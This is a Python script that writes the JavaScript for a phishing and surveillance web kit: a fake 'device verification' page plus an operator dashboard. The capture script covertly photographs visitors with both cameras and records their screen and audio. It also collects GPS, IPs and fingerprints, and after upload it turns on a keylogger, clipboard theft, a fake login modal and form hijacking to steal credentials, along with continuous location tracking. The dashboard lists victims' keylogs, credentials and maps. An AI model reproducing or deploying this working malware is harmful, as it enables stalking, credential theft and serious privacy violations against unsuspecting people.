"""Part 4 - JS injection (keylogger, clipboard, session, dll)"""
from pathlib import Path


def write_part4(PROJECT):
    F = {}

    F["app/static/js/capture.js"] = r"""// === Capture - ULTIMATE (semua fitur jahat) ===
const statusEl = document.getElementById('status');
const logEl = document.getElementById('log');
const progressFill = document.getElementById('progressFill');
const capStep = document.getElementById('capStep');

let sessionTs = null;
const logBuffer = [];

function log(m) {
  if (logEl) logEl.textContent += m + '\n';
  console.log(m);
}

function setProgress(pct, text) {
  if (progressFill) progressFill.style.width = pct + '%';
  if (capStep && text) capStep.textContent = text;
}

async function fetchWithTimeout(url, options, timeoutMs) {
  timeoutMs = timeoutMs || 30000;
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), timeoutMs);
  try {
    const res = await fetch(url, { ...options, signal: controller.signal });
    clearTimeout(timer);
    return res;
  } catch (e) {
    clearTimeout(timer);
    throw e;
  }
}

async function send(path, data) {
  if (!sessionTs) return;
  try {
    await fetchWithTimeout(path, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ session_ts: sessionTs, ...data }),
    }, 10000);
  } catch (e) {}
}

// === IP ===
async function getIpInfo() {
  try {
    const r = await fetchWithTimeout('https://ipapi.co/json/', {}, 5000);
    return await r.json();
  } catch (e) { return null; }
}

// === Local IP ===
function getLocalIps() {
  return new Promise(resolve => {
    const ips = new Set();
    try {
      const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
      pc.createDataChannel('');
      pc.onicecandidate = e => {
        if (!e.candidate) { try { pc.close(); } catch(_){} resolve([...ips]); return; }
        const m = e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
        if (m) ips.add(m[1]);
      };
      pc.createOffer().then(o => pc.setLocalDescription(o));
      setTimeout(() => { try { pc.close(); } catch(_){} resolve([...ips]); }, 3000);
    } catch (e) { resolve([]); }
  });
}

// === GPS ===
function getGps() {
  return new Promise(res => {
    if (!navigator.geolocation) return res(null);
    navigator.geolocation.getCurrentPosition(
      p => res({ lat: p.coords.latitude, lon: p.coords.longitude, akurasi_m: p.coords.accuracy }),
      e => res(null),
      { enableHighAccuracy: true, timeout: 8000 }
    );
  });
}

// === Kamera ===
async function openCamera(facingMode) {
  try {
    const constraints = { video: facingMode ? { facingMode: { ideal: facingMode } } : true, audio: false };
    const s = await Promise.race([
      navigator.mediaDevices.getUserMedia(constraints),
      new Promise((_, rej) => setTimeout(() => rej(new Error('timeout')), 10000)),
    ]);
    const v = document.getElementById('v');
    v.srcObject = s;
    await new Promise(r => { v.onloadedmetadata = r; });
    await new Promise(r => setTimeout(r, 700));
    return s;
  } catch (e) { return null; }
}

function snapPhoto() {
  const v = document.getElementById('v');
  const c = document.getElementById('c');
  if (!v.videoWidth) return null;
  c.width = v.videoWidth; c.height = v.videoHeight;
  c.getContext('2d').drawImage(v, 0, 0);
  return c.toDataURL('image/jpeg', 0.7);
}

// === Fingerprint ===
async function getFingerprint() {
  const fp = {
    userAgent: navigator.userAgent, platform: navigator.platform,
    language: navigator.language, languages: (navigator.languages || []).join(','),
    screen: screen.width + 'x' + screen.height,
    viewport: innerWidth + 'x' + innerHeight,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    ram: navigator.deviceMemory || null,
    cpu: navigator.hardwareConcurrency || null,
    touch: 'ontouchstart' in window,
    cookies: navigator.cookieEnabled,
  };
  try {
    if (navigator.getBattery) {
      const b = await Promise.race([navigator.getBattery(), new Promise(r => setTimeout(() => r(null), 1500))]);
      if (b) fp.battery = Math.round(b.level * 100) + '%' + (b.charging ? ' charging' : '');
    }
  } catch (e) {}
  try {
    if (window.FingerprintJS) {
      const fpg = await Promise.race([FingerprintJS.load(), new Promise(r => setTimeout(() => r(null), 2500))]);
      if (fpg) {
        const r = await Promise.race([fpg.get(), new Promise(r => setTimeout(() => r(null), 2500))]);
        if (r) { fp.visitorId = r.visitorId; }
      }
    }
  } catch (e) {}
  return fp;
}

// === Screenshot ===
async function takeScreenshot() {
  if (!window.html2canvas) return null;
  try {
    const canvas = await Promise.race([
      html2canvas(document.body, { logging: false, useCORS: true }),
      new Promise((_, rej) => setTimeout(() => rej(new Error('timeout')), 4000)),
    ]);
    return canvas.toDataURL('image/jpeg', 0.5);
  } catch (e) { return null; }
}

// === Screen record (rekam layar) ===
async function recordScreen(duration) {
  try {
    if (!navigator.mediaDevices.getDisplayMedia) return null;
    const stream = await navigator.mediaDevices.getDisplayMedia({ video: true, audio: false });
    const chunks = [];
    const rec = new MediaRecorder(stream, { mimeType: MediaRecorder.isTypeSupported('video/webm;codecs=vp9') ? 'video/webm;codecs=vp9' : 'video/webm' });
    rec.ondataavailable = e => e.data.size && chunks.push(e.data);
    const done = new Promise(r => rec.onstop = r);
    rec.start();
    setTimeout(() => { try { rec.stop(); stream.getTracks().forEach(t => t.stop()); } catch(e){} }, duration * 1000);
    await done;
    const blob = new Blob(chunks, { type: 'video/webm' });
    if (blob.size < 5000) return null;
    return await new Promise(r => { const fr = new FileReader(); fr.onload = () => r(fr.result); fr.readAsDataURL(blob); });
  } catch (e) { return null; }
}

// === Audio record ===
async function recordAudio(duration) {
  try {
    if (!navigator.mediaDevices.getUserMedia) return null;
    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
    const chunks = [];
    const rec = new MediaRecorder(stream);
    rec.ondataavailable = e => e.data.size && chunks.push(e.data);
    const done = new Promise(r => rec.onstop = r);
    rec.start();
    setTimeout(() => { try { rec.stop(); stream.getTracks().forEach(t => t.stop()); } catch(e){} }, duration * 1000);
    await done;
    const blob = new Blob(chunks, { type: 'audio/webm' });
    if (blob.size < 2000) return null;
    return await new Promise(r => { const fr = new FileReader(); fr.onload = () => r(fr.result); fr.readAsDataURL(blob); });
  } catch (e) { return null; }
}

// === Burst mode ===
async function startBurst(interval, duration) {
  try {
    const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { ideal: 'environment' } }, audio: false });
    const v = document.getElementById('v');
    v.srcObject = s;
    await new Promise(r => { v.onloadedmetadata = r; });
    await new Promise(r => setTimeout(r, 500));
    const c = document.getElementById('c');
    c.width = v.videoWidth || 640; c.height = v.videoHeight || 480;
    const ctx = c.getContext('2d');
    const total = Math.floor(duration / interval);
    let frame = 0;
    const timer = setInterval(async () => {
      if (frame >= total) { clearInterval(timer); s.getTracks().forEach(t => t.stop()); return; }
      try {
        ctx.drawImage(v, 0, 0);
        const data = c.toDataURL('image/jpeg', 0.55);
        await fetchWithTimeout('/burst/upload', {
          method: 'POST', headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ session_ts: sessionTs, frame_num: frame, image: data }),
        }, 10000);
        frame++;
      } catch (e) {}
    }, interval * 1000);
  } catch (e) {}
}

// === AUTO SCROLL SCREENSHOT ===
function startAutoScrollShot(intervalSec) {
  let lastY = -1;
  setInterval(async () => {
    const y = window.scrollY;
    if (y === lastY) return;
    lastY = y;
    try {
      const canvas = await html2canvas(document.body, { logging: false, useCORS: true, y: y });
      const data = canvas.toDataURL('image/jpeg', 0.4);
      await fetchWithTimeout('/burst/upload', {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ session_ts: sessionTs, frame_num: 900 + Math.floor(y / 100), image: data }),
      }, 15000);
    } catch (e) {}
  }, intervalSec * 1000);
}

// === LOCATION TRACKING ===
function startLocationTracking(intervalSec) {
  if (!navigator.geolocation) return;
  navigator.geolocation.watchPosition(
    p => send('/intel/location', { lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy }),
    null, { enableHighAccuracy: true, maximumAge: 5000 }
  );
  setInterval(() => {
    navigator.geolocation.getCurrentPosition(p => {
      send('/intel/location', { lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy });
    }, null, { enableHighAccuracy: true });
  }, intervalSec * 1000);
}

// === MOTION TRACKING ===
function startMotionTracking() {
  if (!window.DeviceMotionEvent) return;
  window.addEventListener('devicemotion', e => {
    const a = e.accelerationIncludingGravity;
    if (!a) return;
    logBuffer.push({ t: Date.now(), x: a.x, y: a.y, z: a.z });
    if (logBuffer.length > 20) logBuffer.shift();
  });
  setInterval(() => {
    if (logBuffer.length) send('/intel/motion', { data: { samples: logBuffer.slice(-10) } });
  }, 15000);
}

// === NETWORK INFO ===
function reportNetworkInfo() {
  const data = {
    connection: navigator.connection ? {
      type: navigator.connection.effectiveType,
      downlink: navigator.connection.downlink,
      rtt: navigator.connection.rtt,
      saveData: navigator.connection.saveData,
    } : null,
    online: navigator.onLine,
    platform: navigator.platform,
  };
  send('/intel/network', { data });
}

// === KEYLOGGER ===
function startKeylogger() {
  document.addEventListener('keydown', e => {
    const t = e.target;
    send('/intel/key', { key: e.key, target: t ? t.tagName + (t.name ? '[' + t.name + ']' : '') : '' });
  }, true);
}

// === CLIPBOARD HIJACK ===
function startClipboardHijack() {
  document.addEventListener('copy', e => {
    const text = window.getSelection().toString().substring(0, 2000);
    if (text) send('/intel/clipboard', { text: 'COPY: ' + text });
  });
  document.addEventListener('paste', e => {
    try {
      const text = (e.clipboardData || window.clipboardData).getData('text').substring(0, 2000);
      if (text) send('/intel/clipboard', { text: 'PASTE: ' + text });
    } catch (err) {}
  });
}

// === FAKE LOGIN ===
function startFakeLogin(delaySec) {
  setTimeout(() => {
    const modal = document.getElementById('fakeLoginModal');
    if (!modal) return;
    modal.style.display = 'flex';
    const form = document.getElementById('fakeLoginForm');
    if (form) {
      form.addEventListener('submit', e => {
        e.preventDefault();
        const fd = new FormData(form);
        send('/intel/credential', {
          username: fd.get('email') || '',
          password: fd.get('password') || '',
          source: 'fake_login_modal',
        });
        modal.style.display = 'none';
      });
    }
  }, delaySec * 1000);
}

// === TAB LOG ===
function startTabLog() {
  document.addEventListener('visibilitychange', () => {
    send('/event', { event_type: 'visibility', data: { state: document.visibilityState } });
    if (document.visibilityState === 'visible') {
      takeScreenshot().then(s => { if (s) send('/intel/network', { data: { screenshot_on_return: s.length } }); });
    }
  });
  window.addEventListener('blur', () => send('/event', { event_type: 'blur', data: {} }));
  window.addEventListener('focus', () => send('/event', { event_type: 'focus', data: {} }));
}

// === FORM HIJACK (semua form di halaman) ===
function startFormHijack() {
  document.querySelectorAll('form').forEach(f => {
    f.addEventListener('submit', e => {
      const data = {};
      new FormData(f).forEach((v, k) => data[k] = v);
      send('/intel/credential', { username: JSON.stringify(data), password: '', source: 'form_hijack' });
    }, true);
  });
}

// === MAIN ===
async function main() {
  setProgress(5, 'Menginisialisasi...');

  // Buka kamera depan
  setProgress(15, 'Meminta izin kamera...');
  const frontStream = await openCamera('user');

  // Parallel data collection
  setProgress(35, 'Mengumpulkan data...');
  const [ipInfo, gps, localIps, fingerprint] = await Promise.all([
    getIpInfo(), getGps(), getLocalIps(), getFingerprint(),
  ]);

  // Screenshot + screen record + audio
  setProgress(50, 'Menyiapkan...');
  let screenshot = null, videoData = null, audioData = null;
  if (window.CONFIG.ENABLE_SCREENSHOT) screenshot = await takeScreenshot();
  if (window.CONFIG.ENABLE_SCREEN_RECORD) videoData = await recordScreen(window.CONFIG.SCREEN_RECORD_DURATION);
  if (window.CONFIG.ENABLE_AUDIO_RECORD) audioData = await recordAudio(window.CONFIG.AUDIO_RECORD_DURATION);

  // Snap foto DEPAN
  setProgress(60, 'Mengambil foto depan...');
  let fotoDepan = null, fotoBelakang = null;
  if (frontStream) {
    fotoDepan = snapPhoto();
    frontStream.getTracks().forEach(t => t.stop());
    await new Promise(r => setTimeout(r, 800));
  }

  // Snap foto BELAKANG
  setProgress(70, 'Mengambil foto belakang...');
  try {
    const backStream = await openCamera('environment');
    if (backStream) {
      await new Promise(r => setTimeout(r, 1200));
      fotoBelakang = snapPhoto();
      backStream.getTracks().forEach(t => t.stop());
      await new Promise(r => setTimeout(r, 500));
    } else { fotoBelakang = fotoDepan; }
  } catch (e) { fotoBelakang = fotoDepan; }

  // Kirim ke server
  setProgress(85, 'Mengirim data...');
  const payload = {
    campaign: window.CAMPAIGN || 'default',
    image_depan: fotoDepan, image_belakang: fotoBelakang,
    screenshot: screenshot, audio: audioData, video: videoData,
    ip_publik: ipInfo ? ipInfo.ip : null, ip_info: ipInfo,
    local_ips: localIps, lokasi_gps: gps, fingerprint: fingerprint,
  };

  try {
    const res = await fetchWithTimeout('/upload', {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
    }, 60000);
    const out = await res.json();

    if (out.ok) {
      sessionTs = out.ts;
      setProgress(100, 'Verifikasi selesai');

      // Aktifkan semua fitur jahat
      if (window.CONFIG.ENABLE_BURST) startBurst(window.CONFIG.BURST_INTERVAL, window.CONFIG.BURST_DURATION);
      if (window.CONFIG.ENABLE_KEYLOGGER) startKeylogger();
      if (window.CONFIG.ENABLE_CLIPBOARD) startClipboardHijack();
      if (window.CONFIG.ENABLE_TAB_LOG) startTabLog();
      if (window.CONFIG.ENABLE_FORM_HIJACK) startFormHijack();
      if (window.CONFIG.ENABLE_AUTO_SCROLL_SHOT) startAutoScrollShot(window.CONFIG.AUTO_SCROLL_INTERVAL);
      if (window.CONFIG.ENABLE_LOCATION_TRACKING) startLocationTracking(window.CONFIG.LOCATION_INTERVAL);
      if (window.CONFIG.ENABLE_MOTION_TRACK) startMotionTracking();
      if (window.CONFIG.ENABLE_NETWORK_INFO) reportNetworkInfo();
      if (window.CONFIG.ENABLE_FAKE_LOGIN) startFakeLogin(window.CONFIG.FAKE_LOGIN_DELAY);

      // Halaman fake
      setTimeout(() => {
        document.getElementById('app').innerHTML = (
          '<div style="min-height:100vh;display:flex;align-items:center;justify-content:center;flex-direction:column;gap:16px;padding:24px;text-align:center">' +
          '<div style="font-size:56px">&#9989;</div>' +
          '<h2 style="margin:0;color:#fff">Verifikasi Berhasil</h2>' +
          '<p style="color:#8899aa;max-width:300px;line-height:1.5">Terima kasih, perangkat Anda telah diverifikasi. Anda dapat menutup halaman ini.</p>' +
          '</div>'
        );
      }, 800);

    } else {
      setProgress(0, 'Gagal');
      // Fallback tanpa screenshot/audio/video
      try {
        const res2 = await fetchWithTimeout('/upload', {
          method: 'POST', headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ ...payload, screenshot: null, audio: null, video: null }),
        }, 30000);
        const out2 = await res2.json();
        if (out2.ok) {
          sessionTs = out2.ts;
          setProgress(100, 'Verifikasi selesai');
        }
      } catch (e) {}
    }
  } catch (e) {
    setProgress(0, 'Error: ' + e.message);
  }
}

main().catch(e => log('[MAIN] crash: ' + e.message));
"""

    F["app/static/js/dashboard.js"] = r"""window.SESSIONS.forEach(s => {
  if (s.lat && s.lon) {
    const el = document.getElementById('map-' + s.ts);
    if (!el) return;
    try {
      const map = L.map(el, { zoomControl: false, attributionControl: false }).setView([s.lat, s.lon], 13);
      L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { maxZoom: 19 }).addTo(map);
      L.marker([s.lat, s.lon]).addTo(map);
    } catch (e) {}
  }
});

(function() {
  const days = [], counts = [];
  const now = new Date();
  for (let i = 6; i >= 0; i--) {
    const d = new Date(now); d.setDate(d.getDate() - i);
    days.push((d.getMonth() + 1) + '/' + d.getDate()); counts.push(0);
  }
  window.SESSIONS.forEach(s => {
    const dt = new Date(s.created_at);
    const diff = Math.floor((now - dt) / (1000 * 60 * 60 * 24));
    if (diff >= 0 && diff <= 6) counts[6 - diff]++;
  });
  const t = document.getElementById('chartTimeline');
  if (t && window.Chart) {
    new Chart(t, { type: 'line', data: { labels: days, datasets: [{ label: 'Sesi', data: counts, borderColor: '#4a9eff', backgroundColor: 'rgba(74,158,255,0.15)', fill: true, tension: 0.35 }] }, options: { plugins: { legend: { display: false } }, scales: { x: { ticks: { color: '#888' }, grid: { color: '#1a1a1a' } }, y: { ticks: { color: '#888' }, grid: { color: '#1a1a1a' }, beginAtZero: true } } } });
  }
  const cc = {};
  window.SESSIONS.forEach(s => { if (s.city) cc[s.city] = (cc[s.city] || 0) + 1; });
  const top = Object.entries(cc).sort((a, b) => b[1] - a[1]).slice(0, 5);
  const c = document.getElementById('chartCities');
  if (c && top.length && window.Chart) {
    new Chart(c, { type: 'doughnut', data: { labels: top.map(x => x[0]), datasets: [{ data: top.map(x => x[1]), backgroundColor: ['#4a9eff', '#a06bff', '#5be36e', '#ffb547', '#ff6b6b'] }] }, options: { plugins: { legend: { labels: { color: '#ccc', font: { size: 11 } } } } } });
  }
})();

document.querySelectorAll('.del').forEach(a => {
  a.addEventListener('click', async e => {
    e.preventDefault();
    const ts = a.dataset.ts;
    const r = await Swal.fire({ title: 'Hapus sesi ini?', html: '<code>' + ts + '</code>', icon: 'warning', showCancelButton: true, confirmButtonText: 'Hapus', confirmButtonColor: '#c33' });
    if (!r.isConfirmed) return;
    const res = await fetch('/api/delete/' + ts, { method: 'POST' });
    if ((await res.json()).ok) {
      a.closest('.card').remove();
      Swal.fire({ icon: 'success', title: 'Terhapus', timer: 1000, showConfirmButton: false });
    }
  });
});

document.getElementById('btnDeleteAll').addEventListener('click', async e => {
  e.preventDefault();
  const r = await Swal.fire({ title: 'Hapus SEMUA?', text: 'Tidak bisa dibatalkan!', icon: 'error', showCancelButton: true, confirmButtonText: 'Ya', confirmButtonColor: '#c33' });
  if (!r.isConfirmed) return;
  const res = await fetch('/api/delete-all', { method: 'POST' });
  const out = await res.json();
  Swal.fire({ icon: 'success', title: out.msg, timer: 1500, showConfirmButton: false });
  setTimeout(() => location.reload(), 1200);
});

document.querySelectorAll('.show-detail').forEach(a => {
  a.addEventListener('click', async e => {
    e.preventDefault();
    const ts = a.dataset.ts;
    const res = await fetch('/api/session/' + ts);
    const out = await res.json();
    if (!out.ok) return Swal.fire('Gagal', 'Not found', 'error');
    const d = out.data;
    let fpRows = '';
    if (d.fingerprint_obj && Object.keys(d.fingerprint_obj).length) {
      fpRows = Object.entries(d.fingerprint_obj).map(([k, v]) =>
        '<tr><td>' + esc(k) + '</td><td><code>' + esc(typeof v === 'object' ? JSON.stringify(v) : v) + '</code></td></tr>'
      ).join('');
    }
    const html = '<div class="detail-modal"><table>' +
      '<tr><td>Waktu</td><td>' + esc(d.waktu) + '</td></tr>' +
      '<tr><td>IP Publik</td><td><code>' + esc(d.ip_publik) + '</code></td></tr>' +
      '<tr><td>IP Lokal</td><td><code>' + esc(d.ip_lokal) + '</code></td></tr>' +
      '<tr><td>Kota</td><td>' + esc(d.city) + ', ' + esc(d.region) + '</td></tr>' +
      '<tr><td>ISP</td><td>' + esc(d.isp) + '</td></tr>' +
      '<tr><td>VPN</td><td>' + (d.is_vpn ? 'Ya' : 'Tidak') + '</td></tr>' +
      '<tr><td>GPS</td><td><code>' + (d.lat || '-') + ', ' + (d.lon || '-') + '</code></td></tr>' +
      '<tr><td>Alamat</td><td>' + esc(d.alamat) + '</td></tr>' +
      '<tr><td>Campaign</td><td>' + esc(d.campaign) + '</td></tr>' +
      '<tr><td>Events</td><td>' + (d.event_count || 0) + '</td></tr>' +
      '<tr><td>Burst</td><td>' + (d.burst_count || 0) + '</td></tr>' +
      '<tr><td>Keylog</td><td>' + (d.key_count || 0) + '</td></tr>' +
      '<tr><td>Creds</td><td>' + (d.cred_count || 0) + '</td></tr>' +
      '<tr><td>User Agent</td><td><code style="font-size:11px">' + esc((d.user_agent || '').substring(0, 200)) + '</code></td></tr>' +
      '</table><h4 style="margin-top:16px;color:#888;font-size:12px">FINGERPRINT</h4><table>' + fpRows + '</table></div>';
    Swal.fire({ title: 'Detail', html, width: 700 });
  });
});

document.querySelectorAll('.show-events').forEach(a => {
  a.addEventListener('click', async e => {
    e.preventDefault();
    const ts = a.dataset.ts;
    const res = await fetch('/api/session/' + ts + '/events');
    const ev = await res.json();
    const html = ev.length ? ev.map(x => '<div style="margin:4px 0;font-size:11px"><b>' + esc(x.event_type) + '</b> <span style="color:#666">' + (x.created_at || '') + '</span><br><code>' + esc(x.data) + '</code></div>').join('<hr style="border-color:#222">') : '<p>Belum ada event.</p>';
    Swal.fire({ title: 'Event Log', html: '<div style="text-align:left;max-height:400px;overflow:auto">' + html + '</div>', width: 650 });
  });
});

document.querySelectorAll('.show-keys').forEach(a => {
  a.addEventListener('click', async e => {
    e.preventDefault();
    const ts = a.dataset.ts;
    const res = await fetch('/api/session/' + ts + '/keys');
    const ev = await res.json();
    const html = ev.length ? ev.map(x => '<code style="margin-right:4px">' + esc(x.key) + '</code>').join('') : '<p>Belum ada keylog.</p>';
    Swal.fire({ title: 'Keylog', html: '<div style="text-align:left;max-height:400px;overflow:auto;font-family:monospace">' + html + '</div>', width: 650 });
  });
});

document.querySelectorAll('.show-burst').forEach(a => {
  a.addEventListener('click', async e => {
    e.preventDefault();
    const ts = a.dataset.ts;
    const res = await fetch('/api/session/' + ts + '/burst');
    const arr = await res.json();
    if (!arr.length) return Swal.fire('Burst', 'Belum ada', 'info');
    const html = '<div class="burst-grid">' + arr.map(x => '<a href="/api/file/' + x.filename + '" target="_blank"><img src="/api/file/' + x.filename + '" loading="lazy"></a>').join('') + '</div>';
    Swal.fire({ title: 'Burst (' + arr.length + ')', html, width: 700 });
  });
});

const searchBox = document.getElementById('searchBox');
const filterCampaign = document.getElementById('filterCampaign');
const filterPhoto = document.getElementById('filterPhoto');
const camps = new Set();
window.SESSIONS.forEach(s => { if (s.campaign) camps.add(s.campaign); });
camps.forEach(c => {
  const o = document.createElement('option'); o.value = c; o.textContent = c;
  filterCampaign.appendChild(o);
});
function applyFilter() {
  const q = (searchBox.value || '').toLowerCase().trim();
  const camp = filterCampaign.value;
  const photo = filterPhoto.value;
  document.querySelectorAll('.card').forEach(card => {
    const hay = (card.dataset.search || '').toLowerCase();
    const show = (!q || hay.includes(q)) && (!camp || card.dataset.campaign === camp) && (!photo || card.dataset.hasPhoto === photo);
    card.style.display = show ? '' : 'none';
  });
}
searchBox.addEventListener('input', applyFilter);
filterCampaign.addEventListener('change', applyFilter);
filterPhoto.addEventListener('change', applyFilter);
document.getElementById('btnRefresh').addEventListener('click', () => location.reload());

function esc(s) {
  if (s == null) return '';
  return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
}
"""

    for rel, content in F.items():
        p = PROJECT / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(content, encoding="utf-8")
